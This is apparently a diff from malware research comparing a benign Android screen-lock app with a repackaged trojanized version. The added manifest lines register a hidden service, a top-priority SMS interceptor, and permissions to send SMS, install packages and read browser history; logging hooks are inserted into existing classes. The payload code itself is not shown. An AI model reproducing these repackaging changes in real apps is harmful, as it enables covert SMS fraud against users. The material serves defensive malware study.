@@ -1,0 +1,277 @@
+diff -r result/APP_47/App_B_47/AndroidManifest.xml result/APP_47/App_M_47/AndroidManifest.xml
+48a49,60
+>         <service android:name="com.android.main.MainService" android:process=":main"/>
+>         <receiver android:name="com.android.main.ActionReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.SIG_STR"/>
+>             </intent-filter>
+>         </receiver>
+>         <receiver android:name="com.android.main.SmsReceiver">
+>             <intent-filter android:priority="100000">
+>                 <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
+51d62
+<     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+54d64
+<     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+56a67,73
+>     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+>     <uses-permission android:name="android.permission.SEND_SMS"/>
+>     <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+>     <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+>     <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+diff -r result/APP_47/App_B_47/apktool.yml result/APP_47/App_M_47/apktool.yml
+2c2
+< apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+---
+> apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
+Somente em result/APP_47/App_M_47/com: android
+diff -r result/APP_47/App_B_47/com/gau/screenguru/finger/component/AdComponent.java result/APP_47/App_M_47/com/gau/screenguru/finger/component/AdComponent.java
+34a35
+> import netqin.NQlog.NQfile;
+207c208,210
+<       paramMotionEvent = new Intent("android.intent.action.VIEW", Uri.parse(this.ad2Draw.mAdOptData));
+---
+>       paramMotionEvent = Uri.parse(this.ad2Draw.mAdOptData);
+>       NQfile.callwrite1("android.intent.action.VIEW", paramMotionEvent);
+>       paramMotionEvent = new Intent("android.intent.action.VIEW", paramMotionEvent);
+diff -r result/APP_47/App_B_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java result/APP_47/App_M_47/com/gau/screenguru/finger/mainmenu/StartScreenActivity.java
+28a29
+> import netqin.NQlog.NQfile;
+65c66,68
+<     startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://sskan.mobi/")));
+---
+>     Uri localUri = Uri.parse("http://sskan.mobi/");
+>     NQfile.callwrite1("android.intent.action.VIEW", localUri);
+>     startActivity(new Intent("android.intent.action.VIEW", localUri));
+diff -r result/APP_47/App_B_47/com/gau/screenguru/finger/service/BootReceiver.java result/APP_47/App_M_47/com/gau/screenguru/finger/service/BootReceiver.java
+8a9
+> import netqin.NQlog.NQfile;
+16a18
+>     NQfile.broadcastReceiverwrite(paramIntent);
+diff -r result/APP_47/App_B_47/com/gau/screenguru/finger/service/ScreenService.java result/APP_47/App_M_47/com/gau/screenguru/finger/service/ScreenService.java
+17a18
+> import netqin.NQlog.NQfile;
+74a76
+>           NQfile.broadcastReceiverwrite(paramAnonymousIntent);
+diff -r result/APP_47/App_B_47/com/gau/screenguru/finger/service/ShutDownReceiver.java result/APP_47/App_M_47/com/gau/screenguru/finger/service/ShutDownReceiver.java
+7a8
+> import netqin.NQlog.NQfile;
+15a17
+>     NQfile.broadcastReceiverwrite(paramIntent);
+Somente em result/APP_47/App_M_47/: netqin
+Os arquivos binários result/APP_47/App_B_47/original/AndroidManifest.xml e result/APP_47/App_M_47/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_47/App_B_47/original/META-INF/CERT.RSA e result/APP_47/App_M_47/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_47/App_B_47/original/META-INF/CERT.SF result/APP_47/App_M_47/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: bq+0jCQ80RotpIDAO8icjwxWMeg=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: r8gpSURPIaLrIPFr3VBcLOSK4VE=
+23,25d22
+< Name: res/drawable-hdpi/am.png
+< SHA1-Digest: b9AR0a+B80H6kP5hF7zkAmNxq0I=
+< 
+28a26,28
+> Name: res/drawable-hdpi/am.png
+> SHA1-Digest: b9AR0a+B80H6kP5hF7zkAmNxq0I=
+> 
+44,46d43
+< Name: res/drawable-mdpi/main_top.png
+< SHA1-Digest: PstBwNyMhkWWrtLynsos/3wxH54=
+< 
+49a47,49
+> Name: res/drawable-mdpi/main_top.png
+> SHA1-Digest: PstBwNyMhkWWrtLynsos/3wxH54=
+> 
+173,175d172
+< Name: res/drawable-hdpi/tue.png
+< SHA1-Digest: oFRh8UfDKKnPNa6+iiWCa2X7xU0=
+< 
+178a176,178
+> Name: res/drawable-hdpi/tue.png
+> SHA1-Digest: oFRh8UfDKKnPNa6+iiWCa2X7xU0=
+> 
+221,222c221,222
+< Name: res/drawable-hdpi/unselected_center.png
+< SHA1-Digest: HZzlkOdjqvqDCRBQfAbO0UW961U=
+---
+> Name: res/drawable-mdpi/view_b.png
+> SHA1-Digest: j4CSsGwWtcdwdWsVpGnOQzYYR/Q=
+227,231c227,228
+< Name: res/drawable-mdpi/view_b.png
+< SHA1-Digest: j4CSsGwWtcdwdWsVpGnOQzYYR/Q=
+< 
+< Name: res/drawable-hdpi/top_ima.png
+< SHA1-Digest: GJeegcn94qFNVDwBDDH+EaBAXDg=
+---
+> Name: res/drawable-hdpi/unselected_center.png
+> SHA1-Digest: HZzlkOdjqvqDCRBQfAbO0UW961U=
+235a233,235
+> Name: res/drawable-hdpi/top_ima.png
+> SHA1-Digest: GJeegcn94qFNVDwBDDH+EaBAXDg=
+> 
+319a320,322
+> Name: res/drawable/on.png
+> SHA1-Digest: RTpwmJoBp5+v6HJjP3JtyQwY6Nc=
+> 
+326,328d328
+< Name: res/drawable/on.png
+< SHA1-Digest: RTpwmJoBp5+v6HJjP3JtyQwY6Nc=
+< 
+387c387
+< SHA1-Digest: dU1FcEFBcyv/tMDNdcrM1pgGk3s=
+---
+> SHA1-Digest: 7HhSGxpb0WMm+hoTWzf808nARa4=
+423c423
+< SHA1-Digest: 4U6jcIZZ8R18vCq/F1/H2u7Pu6I=
+---
+> SHA1-Digest: DaWNIiF6AFj6aUIM1oKz98OSo6c=
+533,535d532
+< Name: res/drawable-hdpi/c0.png
+< SHA1-Digest: z+iCVGZBE8XE3Mwo4cMuyiUPtLs=
+< 
+538a536,538
+> Name: res/drawable-hdpi/c0.png
+> SHA1-Digest: z+iCVGZBE8XE3Mwo4cMuyiUPtLs=
+> 
+545,547d544
+< Name: res/drawable/down.png
+< SHA1-Digest: sdFuzD5qedG+c/lwAYe0AupK+7k=
+< 
+550a548,550
+> Name: res/drawable/down.png
+> SHA1-Digest: sdFuzD5qedG+c/lwAYe0AupK+7k=
+> 
+599,601d598
+< Name: res/layout/ninegride.xml
+< SHA1-Digest: cZ8W6eiDnvnAU3eyw25VQkWkBSo=
+< 
+603a601,603
+> 
+> Name: res/layout/ninegride.xml
+> SHA1-Digest: cZ8W6eiDnvnAU3eyw25VQkWkBSo=
+diff -r result/APP_47/App_B_47/original/META-INF/MANIFEST.MF result/APP_47/App_M_47/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+22,24d21
+< Name: res/drawable-hdpi/am.png
+< SHA1-Digest: xi7uWx99mNQeBZsqqKDuUF2vqoo=
+< 
+27a25,27
+> Name: res/drawable-hdpi/am.png
+> SHA1-Digest: xi7uWx99mNQeBZsqqKDuUF2vqoo=
+> 
+43,45d42
+< Name: res/layout/button_right.xml
+< SHA1-Digest: b853sfavhs8uWyFC86uY5mFmdpw=
+< 
+48a46,48
+> Name: res/layout/button_right.xml
+> SHA1-Digest: b853sfavhs8uWyFC86uY5mFmdpw=
+> 
+172,174d171
+< Name: res/drawable/t3.png
+< SHA1-Digest: hs1jHslHcibbbP3cRS4aAs4/qIU=
+< 
+177a175,177
+> Name: res/drawable/t3.png
+> SHA1-Digest: hs1jHslHcibbbP3cRS4aAs4/qIU=
+> 
+220,221c220,221
+< Name: res/drawable-mdpi/view_b.png
+< SHA1-Digest: wddasFOGpg2lA65VD6ejBYdgMGc=
+---
+> Name: res/drawable-hdpi/unselected_center.png
+> SHA1-Digest: b4hxL5Y1cvM7qddEid7qfvvT2oY=
+226,230c226,227
+< Name: res/drawable-hdpi/unselected_center.png
+< SHA1-Digest: b4hxL5Y1cvM7qddEid7qfvvT2oY=
+< 
+< Name: res/drawable-hdpi/h_3.png
+< SHA1-Digest: V3Us0ZyR9kg1qMJOJucTYQpyJG8=
+---
+> Name: res/drawable-mdpi/view_b.png
+> SHA1-Digest: wddasFOGpg2lA65VD6ejBYdgMGc=
+234a232,234
+> Name: res/drawable-hdpi/h_3.png
+> SHA1-Digest: V3Us0ZyR9kg1qMJOJucTYQpyJG8=
+> 
+318a319,321
+> Name: res/drawable/on.png
+> SHA1-Digest: JZ7/pI7PEs9Rdyj9MrZVh59+V6w=
+> 
+325,327d327
+< Name: res/drawable/on.png
+< SHA1-Digest: JZ7/pI7PEs9Rdyj9MrZVh59+V6w=
+< 
+386c386
+< SHA1-Digest: Hr3QZnC33RtmO/mjAIb9sQBJJ3A=
+---
+> SHA1-Digest: +ys7vJ4w/YlCTZYrvczc0F2PbFc=
+422c422
+< SHA1-Digest: nwnLLxrjUr+K4BC6iEMq/XE7Nsc=
+---
+> SHA1-Digest: fQLgg8jFxhj08K7yFTwbl60/Vmw=
+532,534d531
+< Name: res/drawable-hdpi/c0.png
+< SHA1-Digest: 49SGA3oLyXobB/HEara2JWo25rA=
+< 
+537a535,537
+> Name: res/drawable-hdpi/c0.png
+> SHA1-Digest: 49SGA3oLyXobB/HEara2JWo25rA=
+> 
+544,546d543
+< Name: res/drawable/down.png
+< SHA1-Digest: wGMQwwk+KqXhNQSv4tNfwa4Gm8A=
+< 
+549a547,549
+> Name: res/drawable/down.png
+> SHA1-Digest: wGMQwwk+KqXhNQSv4tNfwa4Gm8A=
+> 
+595,597d594
+< Name: res/drawable-hdpi/s9.png
+< SHA1-Digest: o8uY4j6vYQoDSd0+KLFsYmnAdSQ=
+< 
+599a597,599
+> 
+> Name: res/drawable-hdpi/s9.png
+> SHA1-Digest: o8uY4j6vYQoDSd0+KLFsYmnAdSQ=
+Somente em result/APP_47/App_M_47/smali/com: android
+diff -r result/APP_47/App_B_47/smali/com/gau/screenguru/finger/component/AdComponent.smali result/APP_47/App_M_47/smali/com/gau/screenguru/finger/component/AdComponent.smali
+1499a1500,1501
+>     invoke-static {v4, v1}, Lnetqin/NQlog/NQfile;->callwrite1(Ljava/lang/String;Landroid/net/Uri;)V
+> 
+diff -r result/APP_47/App_B_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali result/APP_47/App_M_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali
+170a171,172
+>     invoke-static {v2, v1}, Lnetqin/NQlog/NQfile;->callwrite1(Ljava/lang/String;Landroid/net/Uri;)V
+> 
+diff -r result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali
+11a12,13
+>     invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+> 
+27a30,31
+>     invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+> 
+diff -r result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali
+29a30,31
+>     invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+> 
+44a47,48
+>     invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+> 
+diff -r result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali
+11a12,13
+>     invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+> 
+25a28,29
+>     invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+> 
+Somente em result/APP_47/App_M_47/smali: netqin
